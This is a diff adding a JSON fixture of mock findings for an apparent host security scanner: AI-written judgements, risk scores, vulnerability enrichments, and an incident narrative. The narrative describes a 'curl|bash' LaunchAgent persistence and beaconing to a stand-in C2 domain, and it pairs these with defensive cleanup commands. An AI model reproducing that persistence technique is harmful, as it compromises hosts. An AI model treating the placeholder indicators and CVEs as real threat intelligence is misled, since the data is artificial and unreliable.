+        "verdict": "suspicious",
+        "category": "command_and_control",
+        "confidence": 0.7,
+        "reasoning": "Unsigned binary listening on 0.0.0.0:4444.",
+        "remediation": "Close the port; terminate pid 66610.",
+        "model": "claude-haiku-4-5-20251001",
+        "created_at": "$run_start:1",
+        "last_seen_at": "$run_start:1",
+        "novel": null,
+        "context_json": null,
+        "cost_usd": 8e-05
+      }
+    },
+    {
+      "model": "Judgement",
+      "fields": {
+        "content_hash": "hosts_susp",
+        "collector": "hosts_file",
+        "verdict": "suspicious",
+        "category": "defense_evasion",
+        "confidence": 0.78,
+        "reasoning": "Bank login domain pointed at 127.0.0.1 (possible phishing/MITM).",
+        "remediation": "Remove the /etc/hosts override.",
+        "model": "claude-haiku-4-5-20251001",
+        "created_at": "$run_start:1",
+        "last_seen_at": "$run_start:1",
+        "novel": null,
+        "context_json": null,
+        "cost_usd": 7e-05
+      }
+    },
+    {
+      "model": "Judgement",
+      "fields": {
+        "content_hash": "priv_susp",
+        "collector": "privilege_config",
+        "verdict": "suspicious",
+        "category": "privilege_escalation",
+        "confidence": 0.72,
+        "reasoning": "NOPASSWD ALL sudoers rule for a non-admin user.",
+        "remediation": "Remove /etc/sudoers.d/iklo or scope it tightly.",
+        "model": "claude-haiku-4-5-20251001",
+        "created_at": "$run_start:1",
+        "last_seen_at": "$run_start:1",
+        "novel": null,
+        "context_json": null,
+        "cost_usd": 7e-05
+      }
+    },
+    {
+      "model": "Judgement",
+      "fields": {
+        "content_hash": "ssh_susp",
+        "collector": "ssh_authorized_keys",
+        "verdict": "suspicious",
+        "category": "persistence",
+        "confidence": 0.74,
+        "reasoning": "Authorized key with 'root@kali' comment.",
+        "remediation": "Remove the unknown key from ~/.ssh/authorized_keys.",
+        "model": "claude-haiku-4-5-20251001",
+        "created_at": "$run_start:1",
+        "last_seen_at": "$run_start:1",
+        "novel": null,
+        "context_json": null,
+        "cost_usd": 6e-05
+      }
+    },
+    {
+      "model": "Judgement",
+      "fields": {
+        "content_hash": "be_susp",
+        "collector": "browser_extensions",
+        "verdict": "suspicious",
+        "category": "collection",
+        "confidence": 0.66,
+        "reasoning": "Extension requests <all_urls> + webRequest + cookies.",
+        "remediation": "Review/remove the extension at chrome://extensions.",
+        "model": "claude-haiku-4-5-20251001",
+        "created_at": "$run_start:1",
+        "last_seen_at": "$run_start:1",
+        "novel": null,
+        "context_json": null,
+        "cost_usd": 6e-05
+      }
+    },
+    {
+      "model": "Judgement",
+      "fields": {
+        "content_hash": "fs_eicar",
+        "collector": "file_scan",
+        "verdict": "malicious",
+        "category": "test_signature",
+        "confidence": 0.99,
+        "reasoning": "EICAR test file matched a YARA rule — harmless test artifact, but confirms the file scanner is working.",
+        "remediation": "Delete the EICAR test file from ~/Downloads.",
+        "model": "claude-haiku-4-5-20251001",
+        "created_at": "$run_start:1",
+        "last_seen_at": "$run_start:1",
+        "novel": null,
+        "context_json": null,
+        "cost_usd": 5e-05
+      }
+    },
+    {
+      "model": "Judgement",
+      "fields": {
+        "content_hash": "fs_hacktool",
+        "collector": "file_scan",
+        "verdict": "suspicious",
+        "category": "hacktool",
+        "confidence": 0.7,
+        "reasoning": "masscan binary present — legitimate for pentesters, suspicious on a general-purpose host.",
+        "remediation": "Confirm masscan is expected; remove if not.",
+        "model": "claude-haiku-4-5-20251001",
+        "created_at": "$run_start:1",
+        "last_seen_at": "$run_start:1",
+        "novel": null,
+        "context_json": null,
+        "cost_usd": 6e-05
+      }
+    },
+    {
+      "model": "RiskScoreRow",
+      "fields": {
+        "created_at": "$run_start:6",
+        "run_id": "run-6",
+        "score": 88,
+        "grade": "B",
+        "prev_score": null,
+        "drivers_json": [
+          {
+            "label": "Firewall off",
+            "points": 15
+          },
+          {
+            "label": "Remote login (SSH) enabled",
+            "points": 10
+          }
+        ],
+        "explanation": "Posture drift."
+      }
+    },
+    {
+      "model": "RiskScoreRow",
+      "fields": {
+        "created_at": "$run_start:5",
+        "run_id": "run-5",
+        "score": 85,
+        "grade": "B",
+        "prev_score": 88,
+        "drivers_json": [
+          {
+            "label": "Firewall off",
+            "points": 15
+          },
+          {
+            "label": "Remote login (SSH) enabled",
+            "points": 10
+          }
+        ],
+        "explanation": "Posture drift."
+      }
+    },
+    {
+      "model": "RiskScoreRow",
+      "fields": {
+        "created_at": "$run_start:4",
+        "run_id": "run-4",
+        "score": 80,
+        "grade": "B",
+        "prev_score": 85,
+        "drivers_json": [
+          {
+            "label": "Firewall off",
+            "points": 15
+          },
+          {
+            "label": "Remote login (SSH) enabled",
+            "points": 10
+          }
+        ],
+        "explanation": "Posture drift."
+      }
+    },
+    {
+      "model": "RiskScoreRow",
+      "fields": {
+        "created_at": "$run_start:3",
+        "run_id": "run-3",
+        "score": 78,
+        "grade": "C",
+        "prev_score": 80,
+        "drivers_json": [
+          {
+            "label": "Firewall off",
+            "points": 15
+          },
+          {
+            "label": "Remote login (SSH) enabled",
+            "points": 10
+          }
+        ],
+        "explanation": "Posture drift."
+      }
+    },
+    {
+      "model": "RiskScoreRow",
+      "fields": {
+        "created_at": "$run_start:2",
+        "run_id": "run-2",
+        "score": 72,
+        "grade": "C",
+        "prev_score": 78,
+        "drivers_json": [
+          {
+            "label": "Firewall off",
+            "points": 15
+          },
+          {
+            "label": "Remote login (SSH) enabled",
+            "points": 10
+          }
+        ],
+        "explanation": "Posture drift."
+      }
+    },
+    {
+      "model": "RiskScoreRow",
+      "fields": {
+        "created_at": "$run_start:1",
+        "run_id": "run-1",
+        "score": 60,
+        "grade": "D",
+        "prev_score": 72,
+        "drivers_json": [
+          {
+            "label": "Firewall off",
+            "points": 15
+          },
+          {
+            "label": "Remote login (SSH) enabled",
+            "points": 10
+          },
+          {
+            "label": "2 active malicious finding(s)",
+            "points": 40
+          },
+          {
+            "label": "4 active suspicious finding(s)",
+            "points": 24
+          },
+          {
+            "label": "1 NOPASSWD sudoers rule(s)",
+            "points": 10
+          }
+        ],
+        "explanation": "Score down 12. New: 2 active malicious finding(s); 4 active suspicious finding(s)."
+      }
+    },
+    {
+      "model": "IncidentNarrativeRow",
+      "fields": {
+        "created_at": "$run_start:1",
+        "run_id": "run-1",
+        "model": "claude-haiku-4-5-20251001",
+        "severity": "critical",
+        "headline": "Unsigned /tmp binary beaconing to a flagged IP with LaunchAgent persistence",
+        "summary": "A novel unsigned binary (/tmp/.x) is beaconing to 9.9.9.9 and resolving a C2 domain, with a curl|bash LaunchAgent installed for persistence.",
+        "timeline_json": [
+          {
+            "time": "$run_start:1",
+            "title": "Unsigned binary /tmp/.x executed",
+            "category": "execution",
+            "detail": "Spawned by /bin/zsh; high CPU."
+          },
+          {
+            "time": "$run_start:1",
+            "title": "LaunchAgent com.evil.persist added",
+            "category": "persistence",
+            "detail": "RunAtLoad curl|bash."
+          },
+          {
+            "time": "$run_start:1",
+            "title": "Beacon to 9.9.9.9:443 + c2-sync.example",
+            "category": "command_and_control",
+            "detail": "Steady low-volume flow."
+          }
+        ],
+        "actions_json": [
+          {
+            "priority": "immediate",
+            "title": "Kill and remove the binary",
+            "command": "kill 66610 && rm -f /tmp/.x",
+            "detail": "Stop the beacon."
+          },
+          {
+            "priority": "immediate",
+            "title": "Remove persistence",
+            "command": "launchctl unload ~/Library/LaunchAgents/com.evil.persist.plist",
+            "detail": "Then delete the plist."
+          },
+          {
+            "priority": "high",
+            "title": "Block the C2 destination",
+            "command": "",
+            "detail": "Block 9.9.9.9 and sinkhole c2-sync.example."
+          }
+        ],
+        "finding_count": 6,
+        "finding_hashes": [
+          "dns_evil",
+          "hosts_susp",
+          "li_evil",
+          "lp_evil",
+          "nf_evil",
+          "p_evil"
+        ]
+      }
+    },
+    {
+      "model": "EnrichmentRow",
+      "fields": {
+        "source": "osv",
+        "indicator_type": "package",
+        "indicator_value": "openssl@3.0.2",
+        "verdict_hint": "suspicious",
+        "confidence": 0.75,
+        "summary": "OSV: 1 advisory hit(s): CVE-2024-0001",
+        "details_json": {
+          "vuln_ids": [
+            "CVE-2024-0001"
+          ]
+        },
+        "fetched_at": "$run_start:1"
+      }
+    },
+    {
+      "model": "EnrichmentRow",
+      "fields": {
+        "source": "osv",
+        "indicator_type": "package",
+        "indicator_value": "libcurl@7.88.0",
+        "verdict_hint": "suspicious",
+        "confidence": 0.75,
+        "summary": "OSV: 1 advisory hit(s): CVE-2023-38545",
+        "details_json": {
+          "vuln_ids": [
+            "CVE-2023-38545"
+          ]
+        },
+        "fetched_at": "$run_start:1"
+      }
+    },
+    {
+      "model": "EnrichmentRow",
+      "fields": {
+        "source": "nvd",
+        "indicator_type": "cve",
+        "indicator_value": "CVE-2024-0001",
+        "verdict_hint": "malicious",
+        "confidence": 0.7,
+        "summary": "NVD: CVSS=9.8 CRITICAL — heap overflow",
+        "details_json": {
+          "cvss31": {
+            "baseScore": 9.8,
+            "baseSeverity": "CRITICAL"
+          }
+        },
+        "fetched_at": "$run_start:1"
+      }
+    },
+    {
+      "model": "EnrichmentRow",
+      "fields": {
+        "source": "nvd",
+        "indicator_type": "cve",
+        "indicator_value": "CVE-2023-38545",
+        "verdict_hint": "malicious",
+        "confidence": 0.7,
+        "summary": "NVD: CVSS=9.8 CRITICAL — SOCKS5 heap buffer overflow",
+        "details_json": {
+          "cvss31": {
+            "baseScore": 9.8,
+            "baseSeverity": "CRITICAL"
+          }
+        },
+        "fetched_at": "$run_start:1"
+      }
+    },
+    {
+      "model": "EnrichmentRow",
+      "fields": {
+        "source": "cisa_kev",
+        "indicator_type": "cve",
+        "indicator_value": "CVE-2023-38545",
+        "verdict_hint": "malicious",
+        "confidence": 0.98,
+        "summary": "CISA KEV: actively exploited",
+        "details_json": {
+          "knownRansomwareCampaignUse": "Unknown"
+        },
+        "fetched_at": "$run_start:1"
+      }
+    },
+    {
+      "model": "EnrichmentRow",
+      "fields": {
+        "source": "github_advisory",
+        "indicator_type": "cve",
+        "indicator_value": "CVE-2024-0001",
+        "verdict_hint": "malicious",
+        "confidence": 0.9,
+        "summary": "GH Advisory: severity=critical",
+        "details_json": {
+          "severity": "critical",
+          "cvss": {
+            "score": 9.8
+          }
+        },
+        "fetched_at": "$run_start:1"
+      }
+    },
+    {
+      "model": "EnrichmentRow",
+      "fields": {
+        "source": "endoflife",
+        "indicator_type": "os_version",
+        "indicator_value": "macos@12",
+        "verdict_hint": "suspicious",
+        "confidence": 0.6,
+        "summary": "macOS 12 is end-of-life — no security updates.",
+        "details_json": {
+          "eol": true
+        },
+        "fetched_at": "$run_start:1"
+      }
+    }
+  ]
+}
